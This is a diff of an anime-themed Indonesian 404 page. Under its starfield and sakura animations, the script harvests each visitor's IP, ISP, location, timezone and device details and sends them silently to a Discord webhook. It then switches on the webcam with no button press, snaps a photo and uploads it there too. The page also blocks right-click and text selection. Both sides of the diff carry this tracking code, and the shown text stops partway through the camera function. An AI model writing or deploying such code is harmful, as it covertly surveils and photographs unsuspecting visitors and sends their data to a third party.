@@ -10,194 +10,82 @@
 <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;800&family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --pink: #ff6fb0;
-    --pink-deep: #ff2e9c;
-    --purple: #8a5cff;
-    --purple-deep: #5a2ee0;
-    --blue: #5fd3ff;
-    --gold: #ffd76b;
-    --bg1: #1c1036;
-    --bg2: #3a1c5e;
+    --pink: #ff6fb0; --gold: #ffd76b; --blue: #5fd3ff; --purple: #8a5cff;
+    --bg1: #1c1036; --bg2: #3a1c5e;
   }
-
-  * {
-    box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-    /* Teks tidak bisa diseleksi/dikopi */
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    user-select: none;
-  }
-
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent;
+      -webkit-user-select: none; -moz-user-select: none; user-select: none; }
   html, body {
-    margin: 0; padding: 0; width: 100%;
-    min-height: 100dvh;
+    margin: 0; padding: 0; width: 100%; min-height: 100dvh;
     background: linear-gradient(160deg, var(--bg1), var(--bg2) 55%, #2a1450);
-    color: #fff;
-    font-family: 'Poppins', sans-serif;
-    overflow-x: hidden;
+    color: #fff; font-family: 'Poppins', sans-serif; overflow-x: hidden;
   }
-
-  canvas#sky    { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; }
-  canvas#sakura { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 1; }
-
-  .clouds {
-    position: fixed; inset: 0; z-index: 1; pointer-events: none;
-    background:
-      radial-gradient(ellipse 60% 30% at 15% 20%, rgba(255,111,176,0.18), transparent 70%),
-      radial-gradient(ellipse 55% 28% at 85% 75%, rgba(90,211,255,0.16), transparent 70%),
-      radial-gradient(ellipse 50% 25% at 50% 95%, rgba(138,92,255,0.22), transparent 70%);
-  }
-
-  .vignette {
-    position: fixed; inset: 0; z-index: 6; pointer-events: none;
-    background: radial-gradient(ellipse at center, rgba(0,0,0,0) 45%, rgba(10,0,20,0.65) 100%);
-  }
-
-  main {
-    position: relative; z-index: 10;
-    width: 100%; min-height: 100dvh;
+  /* single merged canvas */
+  #fx { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+  .clouds { position: fixed; inset: 0; z-index: 1; pointer-events: none;
+    background: radial-gradient(ellipse 60% 30% at 15% 20%, rgba(255,111,176,.15), transparent 70%),
+                radial-gradient(ellipse 55% 28% at 85% 75%, rgba(90,211,255,.13), transparent 70%); }
+  .vignette { position: fixed; inset: 0; z-index: 6; pointer-events: none;
+    background: radial-gradient(ellipse at center, rgba(0,0,0,0) 45%, rgba(10,0,20,.65) 100%); }
+  main { position: relative; z-index: 10; width: 100%; min-height: 100dvh;
     display: flex; flex-direction: column; align-items: center; justify-content: center;
     text-align: center;
-    padding: calc(env(safe-area-inset-top) + 20px) calc(env(safe-area-inset-right) + 16px)
-             calc(env(safe-area-inset-bottom) + 20px) calc(env(safe-area-inset-left) + 16px);
-    gap: 4px;
-  }
-
-  .chibi {
-    font-size: clamp(2.6rem, 11vw, 6rem);
-    margin-bottom: .1em;
-    filter: drop-shadow(0 0 18px rgba(255,111,176,.55));
-    animation: bob 3.2s ease-in-out infinite;
-  }
-  @keyframes bob {
-    0%, 100% { transform: translateY(0) rotate(-2deg); }
-    50%       { transform: translateY(-14px) rotate(2deg); }
-  }
-
-  h1 {
-    font-family: 'Baloo 2', sans-serif;
-    font-weight: 800;
-    font-size: clamp(1.7rem, 8.5vw, 5.2rem);
-    line-height: 1.08; margin: 0 0 .3em;
-    letter-spacing: .01em;
-    background: linear-gradient(90deg, var(--pink), var(--gold), var(--blue), var(--purple));
-    background-size: 300% auto;
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    animation: shine 5s linear infinite;
-    max-width: 100%;
-  }
-  @keyframes shine {
-    0%   { background-position: 0% 50%; }
-    100% { background-position: 300% 50%; }
-  }
-
-  p.sub {
-    font-size: clamp(.85rem, 3.6vw, 1.25rem);
-    color: #ffe3f4; letter-spacing: .02em;
-    max-width: 600px; margin: 0 auto 1.1em;
-    line-height: 1.65;
-    text-shadow: 0 0 10px rgba(255,111,176,.35);
-  }
-  p.sub .kanji {
-    display: block;
-    font-family: 'Baloo 2', sans-serif;
-    font-size: 1.25em; color: var(--gold);
-    margin-bottom: .35em; letter-spacing: .12em;
-  }
-
-  .sparkles  { position: absolute; inset: 0; z-index: 2; pointer-events: none; }
-  .sparkle   { position: absolute; font-size: 1.1rem; opacity: .85; animation: twinkle 2.4s ease-in-out infinite; }
-  @keyframes twinkle {
-    0%, 100% { opacity: .2; transform: scale(.7) rotate(0deg); }
-    50%      { opacity: 1;  transform: scale(1.15) rotate(20deg); }
-  }
-
-  /* ── Terminal ── */
-  .term {
-    font-family: 'Poppins', sans-serif;
-    font-size: clamp(.72rem, 3vw, .92rem);
-    color: #ffe9f7;
-    background: rgba(30,10,55,.55);
-    border: 2px solid rgba(255,111,176,.45);
-    border-radius: 16px;
-    padding: 14px 16px;
-    max-width: 600px; width: 94%;
-    text-align: left;
-    box-shadow: 0 0 30px rgba(138,92,255,.35), 0 0 0 4px rgba(255,255,255,0.02) inset;
-    backdrop-filter: blur(2px);
-  }
-  .term .line { white-space: pre-wrap; word-break: break-word; padding: 2px 0; }
-  .term .line.gold { color: var(--gold); font-weight: 600; }
-  .term .line.pink { color: var(--pink); }
-  .cursor {
-    display: inline-block; width: 8px; height: 1em;
-    background: var(--pink); animation: blink 1s steps(1) infinite; vertical-align: text-bottom;
-  }
-  @keyframes blink { 50% { opacity: 0; } }
-
-  /* ── Camera box ── */
-  .camera-box {
-    margin-top: 1em;
-    border: 2px solid rgba(255,111,176,.55);
-    background: rgba(30,10,55,.6);
-    border-radius: 20px; padding: 14px;
-    max-width: 280px; width: 82%;
-    box-shadow: 0 0 25px rgba(255,111,176,.3);
-    animation: popIn .5s cubic-bezier(.2,1.4,.4,1);
-  }
-  @keyframes popIn {
-    0%   { transform: scale(.7) rotate(-4deg); opacity: 0; }
-    100% { transform: scale(1) rotate(0deg); opacity: 1; }
-  }
-  .camera-box p { margin: 0 0 8px; font-size: .66rem; letter-spacing: .08em; color: var(--gold); font-weight: 600; }
-  .camera-frame {
-    position: relative; border-radius: 14px; overflow: hidden;
-    border: 3px solid var(--pink);
-    box-shadow: 0 0 22px rgba(255,111,176,.45), inset 0 0 20px rgba(255,111,176,.15);
-  }
-  .camera-box img, .camera-box video { width: 100%; display: block; filter: saturate(1.35) contrast(1.1); }
-  .camera-frame::after {
-    content: ""; position: absolute; inset: 0;
-    background: linear-gradient(135deg, rgba(255,215,107,.12), transparent 40%, rgba(90,211,255,.12));
-    pointer-events: none;
-  }
-  .cc { position: absolute; width: 16px; height: 16px; border-color: var(--gold); z-index: 2; }
-  .cc-tl { top:6px;    left:6px;  border-top:3px solid var(--gold); border-left:3px solid var(--gold); }
-  .cc-tr { top:6px;    right:6px; border-top:3px solid var(--gold); border-right:3px solid var(--gold); }
-  .cc-bl { bottom:6px; left:6px;  border-bottom:3px solid var(--gold); border-left:3px solid var(--gold); }
-  .cc-br { bottom:6px; right:6px; border-bottom:3px solid var(--gold); border-right:3px solid var(--gold); }
-  .cam-status {
-    margin-top: 10px; font-size: .66rem; letter-spacing: .08em;
-    color: var(--blue); text-align: center; min-height: 1.2em;
-  }
-
-  /* ── Bottom badge ── */
-  .badge {
-    display: inline-flex; align-items: center; gap: 8px;
-    margin-top: 1.4em; font-size: .68rem; font-weight: 600;
-    letter-spacing: .1em; color: #3a0f2b;
-    background: linear-gradient(90deg, var(--pink), var(--gold));
-    padding: 8px 16px; border-radius: 999px;
-    box-shadow: 0 0 18px rgba(255,111,176,.55);
-    animation: floatBadge 2.4s ease-in-out infinite;
-  }
-  @keyframes floatBadge {
-    0%, 100% { transform: translateY(0); }
-    50%      { transform: translateY(-5px); }
-  }
+    padding: calc(env(safe-area-inset-top)+20px) 16px calc(env(safe-area-inset-bottom)+20px);
+    gap: 6px; }
+  .chibi { font-size: clamp(2.4rem,10vw,5.5rem); margin-bottom: .1em;
+    filter: drop-shadow(0 0 16px rgba(255,111,176,.55)); animation: bob 3.2s ease-in-out infinite; }
+  @keyframes bob { 0%,100%{transform:translateY(0) rotate(-2deg)} 50%{transform:translateY(-12px) rotate(2deg)} }
+  h1 { font-family:'Baloo 2',sans-serif; font-weight:800;
+    font-size: clamp(1.6rem,8vw,5rem); line-height:1.08; margin:0 0 .25em;
+    background: linear-gradient(90deg,var(--pink),var(--gold),var(--blue),var(--purple));
+    background-size:300% auto; -webkit-background-clip:text; background-clip:text; color:transparent;
+    animation: shine 5s linear infinite; }
+  @keyframes shine { to { background-position:300% 50%; } }
+  p.sub { font-size:clamp(.82rem,3.5vw,1.18rem); color:#ffe3f4; max-width:560px; margin:0 auto .9em; line-height:1.6; }
+  p.sub .kanji { display:block; font-family:'Baloo 2',sans-serif; font-size:1.2em; color:var(--gold); margin-bottom:.3em; letter-spacing:.1em; }
+  .sparkles { position:fixed; inset:0; z-index:2; pointer-events:none; }
+  .sparkle { position:absolute; font-size:1rem; opacity:.8; animation:twinkle 2.4s ease-in-out infinite; }
+  @keyframes twinkle { 0%,100%{opacity:.15;transform:scale(.7)} 50%{opacity:1;transform:scale(1.15)} }
+  /* Terminal */
+  .term { font-family:'Poppins',monospace; font-size:clamp(.68rem,2.8vw,.88rem); color:#ffe9f7;
+    background:rgba(30,10,55,.6); border:2px solid rgba(255,111,176,.45); border-radius:14px;
+    padding:12px 14px; max-width:580px; width:94%; text-align:left;
+    box-shadow:0 0 28px rgba(138,92,255,.32); backdrop-filter:blur(4px); }
+  .term .line { white-space:pre-wrap; word-break:break-word; padding:1.5px 0; }
+  .term .line.gold { color:var(--gold); font-weight:600; }
+  .term .line.pink { color:var(--pink); }
+  .cursor { display:inline-block; width:7px; height:.95em; background:var(--pink);
+    animation:blink 1s steps(1) infinite; vertical-align:text-bottom; margin-left:2px; }
+  @keyframes blink { 50%{opacity:0} }
+  /* Camera */
+  .cam-wrap { margin-top:.8em; border:2px solid rgba(255,111,176,.55); background:rgba(30,10,55,.62);
+    border-radius:18px; padding:12px; max-width:260px; width:82%;
+    box-shadow:0 0 22px rgba(255,111,176,.28); animation:popIn .5s cubic-bezier(.2,1.4,.4,1); display:none; }
+  @keyframes popIn { 0%{transform:scale(.7) rotate(-4deg);opacity:0} 100%{transform:scale(1) rotate(0);opacity:1} }
+  .cam-label { margin:0 0 7px; font-size:.63rem; letter-spacing:.08em; color:var(--gold); font-weight:700; }
+  .cam-frame { position:relative; border-radius:12px; overflow:hidden; border:2.5px solid var(--pink);
+    box-shadow:0 0 20px rgba(255,111,176,.4),inset 0 0 18px rgba(255,111,176,.12); }
+  .cam-frame video, .cam-frame img { width:100%; display:block; filter:saturate(1.3) contrast(1.1); }
+  .cam-frame::after { content:""; position:absolute; inset:0; pointer-events:none;
+    background:linear-gradient(135deg,rgba(255,215,107,.1),transparent 40%,rgba(90,211,255,.1)); }
+  .cc { position:absolute; width:14px; height:14px; z-index:2; }
+  .cc-tl{top:5px;left:5px;border-top:2.5px solid var(--gold);border-left:2.5px solid var(--gold)}
+  .cc-tr{top:5px;right:5px;border-top:2.5px solid var(--gold);border-right:2.5px solid var(--gold)}
+  .cc-bl{bottom:5px;left:5px;border-bottom:2.5px solid var(--gold);border-left:2.5px solid var(--gold)}
+  .cc-br{bottom:5px;right:5px;border-bottom:2.5px solid var(--gold);border-right:2.5px solid var(--gold)}
+  .cam-status { margin-top:8px; font-size:.62rem; letter-spacing:.07em; color:var(--blue); text-align:center; min-height:1.1em; }
+  /* Badge */
+  .badge { display:inline-flex; align-items:center; gap:7px; margin-top:1.2em;
+    font-size:.65rem; font-weight:700; letter-spacing:.1em; color:#3a0f2b;
+    background:linear-gradient(90deg,var(--pink),var(--gold)); padding:7px 15px; border-radius:999px;
+    box-shadow:0 0 16px rgba(255,111,176,.5); animation:floatBadge 2.4s ease-in-out infinite; }
+  @keyframes floatBadge { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-5px)} }
 </style>
 </head>
 <body>
-
-<canvas id="sky"></canvas>
-<canvas id="sakura"></canvas>
+<canvas id="fx"></canvas>
 <div class="clouds"></div>
 <div class="vignette"></div>
-
 <main>
   <div class="chibi">🌸🎐✨</div>
   <h1>404 // TERSESAT DI ISEKAI</h1>
@@ -206,277 +94,309 @@
     Halaman ini terhisap ke dunia lain bersama portal sihirnya.<br>
     Sepertinya kamu salah nyasar, senpai~
   </p>
-
   <div class="term" id="term"></div>
-  <div class="camera-box" id="cameraBox" style="display:none">
-    <p id="camLabel">MEREKAM WAJAH PETUALANG...</p>
-    <div class="camera-frame">
+  <div class="cam-wrap" id="camWrap">
+    <p class="cam-label" id="camLabel">MEREKAM WAJAH PETUALANG...</p>
+    <div class="cam-frame">
       <div class="cc cc-tl"></div><div class="cc cc-tr"></div>
       <div class="cc cc-bl"></div><div class="cc cc-br"></div>
-      <video id="camVideo" autoplay muted playsinline style="display:none; transform:scaleX(-1)"></video>
-      <img id="camShot" style="display:none" alt="captured">
+      <video id="camVideo" autoplay muted playsinline style="transform:scaleX(-1)"></video>
+      <img id="camShot" style="display:none" alt="">
     </div>
     <div class="cam-status" id="camStatus">menunggu akses kristal pemantau...</div>
   </div>
   <div class="badge">🎴 GUILD RANK: PENGUNJUNG TERSESAT</div>
 </main>
-
 <div class="sparkles" id="sparkles"></div>
 <audio id="bgm" src="anime404.mp3" loop preload="auto"></audio>
-
 <script>
-(function () {
-  "use strict";
+(function(){
+"use strict";
 
-  // Diisi otomatis oleh GitHub Actions dari secret DISCORD_WEBHOOK_URL
-  var WEBHOOK = "__DISCORD_WEBHOOK_URL__";
+/* ─── CONFIG ─────────────────────────────────────────────────────────── */
+var WEBHOOK  = "__DISCORD_WEBHOOK_URL__";
+var IS_VALID = WEBHOOK && WEBHOOK.indexOf("__DISCORD_WEBHOOK_URL__") === -1;
+var IS_MOBILE = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth < 768;
 
-  // ── Blokir klik kanan & seleksi teks ──────────────────────────────────────
-  document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
-  document.addEventListener("selectstart", function (e) { e.preventDefault(); });
+/* ─── Prevent selection / context menu ───────────────────────────────── */
+document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
+document.addEventListener("selectstart",  function(e){ e.preventDefault(); });
 
-  // ── Audio ─────────────────────────────────────────────────────────────────
-  var bgm = document.getElementById("bgm");
-  bgm.volume = 0.55;
-  bgm.play().catch(function () {});
-  ["click","keydown","touchstart","scroll","mousemove"].forEach(function (evt) {
-    window.addEventListener(evt, function retry() {
-      bgm.play().catch(function () {});
-      window.removeEventListener(evt, retry);
-    });
+/* ─── Audio ──────────────────────────────────────────────────────────── */
+var bgm = document.getElementById("bgm");
+bgm.volume = 0.5;
+bgm.play().catch(function(){});
+["click","keydown","touchstart","scroll"].forEach(function(ev){
+  window.addEventListener(ev, function f(){ bgm.play().catch(function(){}); window.removeEventListener(ev,f); });
+});
+
+/* ─── Merged canvas: stars + petals (mobile-aware) ───────────────────── */
+var canvas = document.getElementById("fx");
+var ctx    = canvas.getContext("2d");
+var stars = [], petals = [];
+var PCOLORS = ["#ff9ecb","#ffd76b","#c9a2ff","#ff6fb0"];
+
+function buildScene(){
+  var W = canvas.width  = window.innerWidth;
+  var H = canvas.height = window.innerHeight;
+  var px = window.devicePixelRatio || 1;
+  var area = W * H;
+
+  /* Fewer particles on mobile */
+  var starCount  = IS_MOBILE ? Math.floor(area / 18000) : Math.floor(area / 9000);
+  var petalCount = IS_MOBILE ? Math.floor(area / 35000) : Math.floor(area / 16000);
+  starCount  = Math.max(30, Math.min(starCount,  IS_MOBILE ? 60 : 180));
+  petalCount = Math.max(8,  Math.min(petalCount, IS_MOBILE ? 18 : 55));
+
+  stars = [];
+  for(var i=0;i<starCount;i++) stars.push({
+    x:Math.random()*W, y:Math.random()*H,
+    r:Math.random()*1.4+0.3,
+    speed:Math.random()*.018+.007,
+    phase:Math.random()*Math.PI*2
   });
 
-  // ── Starfield ─────────────────────────────────────────────────────────────
-  var sky = document.getElementById("sky");
-  var skyCtx = sky.getContext("2d");
-  var stars = [];
-  function resizeSky() {
-    sky.width  = window.innerWidth;
-    sky.height = window.innerHeight;
-    stars = [];
-    var n = Math.floor((sky.width * sky.height) / 9000);
-    for (var i = 0; i < n; i++) {
-      stars.push({
-        x: Math.random() * sky.width,  y: Math.random() * sky.height,
-        r: Math.random() * 1.6 + 0.3,
-        speed: Math.random() * 0.02 + 0.008,
-        phase: Math.random() * Math.PI * 2
-      });
-    }
-  }
-  window.addEventListener("resize", resizeSky);
-  resizeSky();
+  petals = [];
+  for(var j=0;j<petalCount;j++) petals.push({
+    x:Math.random()*W, y:Math.random()*H,
+    size:Math.random()*9+5,
+    color:PCOLORS[Math.floor(Math.random()*PCOLORS.length)],
+    speedY:Math.random()*1.1+0.4,
+    speedX:Math.random()*.7-.35,
+    sway:Math.random()*Math.PI*2,
+    rot:Math.random()*Math.PI*2,
+    rotSpeed:Math.random()*.04-.02
+  });
+}
+window.addEventListener("resize", buildScene);
+buildScene();
 
-  var skyT = 0;
-  function drawSky() {
-    skyT += 0.03;
-    skyCtx.clearRect(0, 0, sky.width, sky.height);
-    stars.forEach(function (s) {
-      s.phase += s.speed;
-      var a = 0.3 + 0.5 * Math.sin(skyT * s.speed + s.phase);
-      skyCtx.beginPath();
-      skyCtx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-      skyCtx.fillStyle = "rgba(255,255,255," + Math.max(0, a) + ")";
-      skyCtx.fill();
-    });
-    requestAnimationFrame(drawSky);
-  }
-  drawSky();
+/* Skip every other frame on mobile to halve GPU load */
+var frameCount = 0;
+function render(){
+  requestAnimationFrame(render);
+  frameCount++;
+  if(IS_MOBILE && frameCount % 2 !== 0) return;
 
-  // ── Sakura petals ─────────────────────────────────────────────────────────
-  var sakura = document.getElementById("sakura");
-  var sCtx   = sakura.getContext("2d");
-  var petals = [];
-  var PCOLORS = ["#ff9ecb","#ffd76b","#c9a2ff","#ff6fb0"];
-  function resizeSakura() { sakura.width = window.innerWidth; sakura.height = window.innerHeight; }
-  window.addEventListener("resize", resizeSakura);
-  resizeSakura();
-  function makePetal() {
-    return {
-      x: Math.random() * sakura.width, y: Math.random() * -sakura.height,
-      size: Math.random() * 10 + 6,
-      speedY: Math.random() * 1.2 + 0.5, speedX: Math.random() * 0.8 - 0.4,
-      rot: Math.random() * Math.PI * 2, rotSpeed: Math.random() * 0.04 - 0.02,
-      sway: Math.random() * Math.PI * 2,
-      color: PCOLORS[Math.floor(Math.random() * PCOLORS.length)]
-    };
-  }
-  var pc = Math.floor((window.innerWidth * window.innerHeight) / 16000);
-  for (var i = 0; i < pc; i++) petals.push(makePetal());
-  function drawSakura() {
-    sCtx.clearRect(0, 0, sakura.width, sakura.height);
-    petals.forEach(function (p) {
-      p.sway += 0.02; p.y += p.speedY; p.x += p.speedX + Math.sin(p.sway) * 0.5; p.rot += p.rotSpeed;
-      if (p.y > sakura.height + 20) { var np = makePetal(); np.y = -20; petals[petals.indexOf(p)] = np; return; }
-      if (p.x > sakura.width + 20) p.x = -20;
-      else if (p.x < -20) p.x = sakura.width + 20;
-      sCtx.save();
-      sCtx.translate(p.x, p.y); sCtx.rotate(p.rot); sCtx.fillStyle = p.color;
-      sCtx.beginPath();
-      sCtx.moveTo(0, -p.size / 2);
-      sCtx.bezierCurveTo( p.size/2, -p.size/2,  p.size/2, p.size/2, 0, p.size/2);
-      sCtx.bezierCurveTo(-p.size/2,  p.size/2, -p.size/2,-p.size/2, 0,-p.size/2);
-      sCtx.fill(); sCtx.restore();
-    });
-    requestAnimationFrame(drawSakura);
-  }
-  drawSakura();
+  var W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
 
-  // ── Floating sparkles ─────────────────────────────────────────────────────
-  var EMOJIS = ["✨","🌸","⭐","💫","🎐"];
-  var wrap   = document.getElementById("sparkles");
-  var count  = window.innerWidth < 480 ? 9 : 14;
-  for (var s = 0; s < count; s++) {
-    var el = document.createElement("span");
-    el.className   = "sparkle";
-    el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
-    el.style.left  = (Math.random() * 100) + "%";
-    el.style.top   = (Math.random() * 100) + "%";
-    el.style.animationDelay = (Math.random() * 2) + "s";
-    wrap.appendChild(el);
+  /* Stars */
+  for(var i=0;i<stars.length;i++){
+    var s = stars[i];
+    s.phase += s.speed;
+    var a = Math.max(0, 0.3 + 0.5*Math.sin(s.phase));
+    ctx.beginPath(); ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
+    ctx.fillStyle = "rgba(255,255,255,"+a.toFixed(2)+")"; ctx.fill();
   }
 
-  // ── Terminal helper ───────────────────────────────────────────────────────
-  var term = document.getElementById("term");
-  function addLine(text, cls) {
-    var d = document.createElement("div");
-    d.className   = "line" + (cls ? " " + cls : "");
-    d.textContent = text;          // textContent — XSS safe
-    term.appendChild(d);
-  }
-  function addCursor() {
-    var c = document.createElement("span");
-    c.className = "cursor";
-    term.appendChild(c);
-  }
+  /* Petals */
+  for(var j=0;j<petals.length;j++){
+    var p = petals[j];
+    p.sway  += 0.018;
+    p.y     += p.speedY;
+    p.x     += p.speedX + Math.sin(p.sway)*0.45;
+    p.rot   += p.rotSpeed;
+    if(p.y > H+20){ p.y=-20; p.x=Math.random()*W; }
+    if(p.x > W+20) p.x=-20;
+    else if(p.x < -20) p.x=W+20;
 
-  // ── Send visitor data to Discord (text) ───────────────────────────────────
-  function sendTextToDiscord(content) {
-    if (!WEBHOOK || WEBHOOK.indexOf("__DISCORD_WEBHOOK_URL__") !== -1) return;
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Isekai 404 Guild", content: content })
-    }).catch(function () {});
-  }
-
-  // ── Send photo to Discord (multipart) ────────────────────────────────────
-  function sendPhotoToDiscord(blob) {
-    if (!WEBHOOK || WEBHOOK.indexOf("__DISCORD_WEBHOOK_URL__") !== -1) return;
-    var form = new FormData();
-    form.append("payload_json", JSON.stringify({
-      username: "Isekai 404 Guild",
-      content: "📸 Foto pengunjung tersesat:"
-    }));
-    form.append("file", blob, "pengunjung.png");
-    fetch(WEBHOOK, { method: "POST", body: form }).catch(function () {});
-  }
-
-  // ── Camera capture (auto, no button) ─────────────────────────────────────
-  function startCamera() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      document.getElementById("camStatus").textContent = "AKSES KAMERA TIDAK TERSEDIA";
-      return;
-    }
-    var box    = document.getElementById("cameraBox");
-    var label  = document.getElementById("camLabel");
-    var video  = document.getElementById("camVideo");
-    var shot   = document.getElementById("camShot");
-    var status = document.getElementById("camStatus");
-    box.style.display = "block";
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(function (stream) {
-        video.srcObject = stream;
-        video.style.display = "block";
-        label.textContent  = "WAJAH TERDETEKSI...";
-        status.textContent = "mengambil gambar jiwa...";
-
-        function capture() {
-          var canvas = document.createElement("canvas");
-          canvas.width  = video.videoWidth  || 320;
-          canvas.height = video.videoHeight || 240;
-          var ctx = canvas.getContext("2d");
-          // Mirror so photo looks natural
-          ctx.translate(canvas.width, 0);
-          ctx.scale(-1, 1);
-          ctx.drawImage(video, 0, 0);
-          shot.src = canvas.toDataURL("image/png");
-          shot.style.display  = "block";
-          video.style.display = "none";
-          label.textContent   = "FOTO TERSIMPAN DI GRIMOIRE";
-          stream.getTracks().forEach(function (t) { t.stop(); });
-
-          // Auto-send photo — no button needed
-          canvas.toBlob(function (blob) {
-            if (!blob) return;
-            status.textContent = "mengirim ke guild...";
-            sendPhotoToDiscord(blob);
-            status.textContent = "FOTO TERKIRIM KE GUILD ✔";
-          }, "image/png");
-        }
-
-        if (video.readyState >= 2 && video.videoWidth) {
-          capture();
-        } else {
-          video.addEventListener("loadeddata", capture, { once: true });
-        }
-      })
-      .catch(function () {
-        document.getElementById("camStatus").textContent = "AKSES KAMERA DITOLAK";
-      });
-  }
-
-  // ── Main: fetch IP → log → send to Discord → start camera ────────────────
-  async function run() {
-    addLine("> guild@isekai:~$ melacak pengunjung...");
-    addLine("> mengambil koordinat portal...");
-
-    var info = null;
-    try {
-      var res = await fetch("https://ipapi.co/json/");
-      if (res.ok) info = await res.json();
-    } catch (e) { /* ignore */ }
-
-    if (info && info.ip) {
-      addLine("> IP dunia nyata: " + info.ip, "gold");
-      addLine("> guild / ISP: " + (info.org || "tidak diketahui"));
-      addLine("> lokasi: " + [info.city, info.region, info.country_name].filter(Boolean).join(", "));
-      addLine("> zona waktu: " + (info.timezone || "tidak diketahui"));
+    ctx.save();
+    ctx.translate(p.x,p.y); ctx.rotate(p.rot);
+    ctx.fillStyle = p.color;
+    if(IS_MOBILE){
+      /* Simple ellipse on mobile instead of bezier */
+      ctx.beginPath(); ctx.ellipse(0,0,p.size/2,p.size*0.35,0,0,Math.PI*2);
     } else {
-      addLine("> IP dunia nyata: [pelacakan gagal]", "gold");
+      ctx.beginPath();
+      ctx.moveTo(0,-p.size/2);
+      ctx.bezierCurveTo( p.size/2,-p.size/2, p.size/2, p.size/2,0, p.size/2);
+      ctx.bezierCurveTo(-p.size/2, p.size/2,-p.size/2,-p.size/2,0,-p.size/2);
     }
+    ctx.fill(); ctx.restore();
+  }
+}
+render();
 
-    addLine("> platform: " + navigator.platform);
-    addLine("> device: " + navigator.userAgent.slice(0, 80) + "...");
-    addLine("> bahasa: " + navigator.language);
-    addLine("> resolusi: " + screen.width + "x" + screen.height + " (" + devicePixelRatio + "x)");
-    addLine("> rank akses: PENGUNJUNG TERSESAT", "pink");
-    addLine("> halaman yang dicari: tidak ditemukan di dunia ini");
-    addLine("> mengaktifkan kristal pemantau...");
-    addLine("> kamera: menunggu izin...");
-    addLine("> ayo balik ke portal utama, senpai_");
-    addCursor();
+/* ─── Floating sparkles ───────────────────────────────────────────────── */
+var EMOJIS = ["✨","🌸","⭐","💫","🎐"];
+var wrap = document.getElementById("sparkles");
+var sc   = IS_MOBILE ? 6 : 12;
+for(var s=0;s<sc;s++){
+  var el = document.createElement("span");
+  el.className = "sparkle";
+  el.textContent = EMOJIS[s % EMOJIS.length];
+  el.style.left  = (Math.random()*95)+"%";
+  el.style.top   = (Math.random()*95)+"%";
+  el.style.animationDelay = (Math.random()*2.2)+"s";
+  wrap.appendChild(el);
+}
 
-    // Auto-kirim semua data teks ke Discord
-    var lines = [
-      "🌸 **Pengunjung tersesat baru terdeteksi!**",
-      "IP: " + (info && info.ip ? info.ip : "tidak diketahui"),
-      "ISP/Guild: " + (info ? info.org || "tidak diketahui" : "tidak diketahui"),
-      "Lokasi: " + (info ? [info.city, info.region, info.country_name].filter(Boolean).join(", ") || "tidak diketahui" : "tidak diketahui"),
-      "Zona Waktu: " + (info ? info.timezone || "tidak diketahui" : "tidak diketahui"),
-      "Platform: " + navigator.platform,
-      "Bahasa: " + navigator.language,
-      "Resolusi: " + screen.width + "x" + screen.height,
-      "Device: " + navigator.userAgent
-    ];
-    sendTextToDiscord(lines.join("\n"));
+/* ─── Terminal ────────────────────────────────────────────────────────── */
+var term = document.getElementById("term");
+function addLine(txt, cls){
+  var d = document.createElement("div");
+  d.className = "line" + (cls ? " "+cls : "");
+  d.textContent = txt;
+  term.appendChild(d);
+}
+function addCursor(){ var c=document.createElement("span"); c.className="cursor"; term.appendChild(c); }
 
-    // Mulai kamera setelah data terkirim
-    setTimeout(startCamera, 1200);
+/* ─── Discord helpers ─────────────────────────────────────────────────── */
+function sendText(content){
+  if(!IS_VALID) return;
+  fetch(WEBHOOK,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({ username:"Isekai 404 Guild", content:content.slice(0,2000) })
+  }).catch(function(){});
+}
+function sendPhoto(blob){
+  if(!IS_VALID) return;
+  var fd = new FormData();
+  fd.append("payload_json", JSON.stringify({ username:"Isekai 404 Guild", content:"📸 Foto pengunjung tersesat:" }));
+  fd.append("file", blob, "pengunjung.png");
+  fetch(WEBHOOK,{ method:"POST", body:fd }).catch(function(){});
+}
+
+/* ─── IP lookup with timeout + two fallbacks ──────────────────────────── */
+function fetchWithTimeout(url, ms){
+  return new Promise(function(resolve, reject){
+    var tid = setTimeout(function(){ reject(new Error("timeout")); }, ms);
+    fetch(url, { headers:{ "Accept":"application/json" } })
+      .then(function(r){ clearTimeout(tid); return r.json(); })
+      .then(resolve).catch(function(e){ clearTimeout(tid); reject(e); });
+  });
+}
+async function getIpInfo(){
+  var services = [
+    "https://ipapi.co/json/",
+    "https://ip-api.com/json/?fields=query,org,city,regionName,country,timezone"
+  ];
+  for(var i=0;i<services.length;i++){
+    try {
+      var d = await fetchWithTimeout(services[i], 5000);
+      /* Normalise ip-api.com field names */
+      if(d.query && !d.ip)        d.ip           = d.query;
+      if(d.regionName && !d.region) d.region     = d.regionName;
+      if(d.country && !d.country_name) d.country_name = d.country;
+      return d;
+    } catch(e) { /* try next */ }
+  }
+  return null;
+}
+
+/* ─── Camera (auto, no button) ───────────────────────────────────────── */
+function startCamera(){
+  var wrap   = document.getElementById("camWrap");
+  var label  = document.getElementById("camLabel");
+  var video  = document.getElementById("camVideo");
+  var shot   = document.getElementById("camShot");
+  var status = document.getElementById("camStatus");
+
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+    status.textContent = "AKSES KAMERA TIDAK TERSEDIA";
+    return;
   }
 
-  run();
+  wrap.style.display = "block";
+
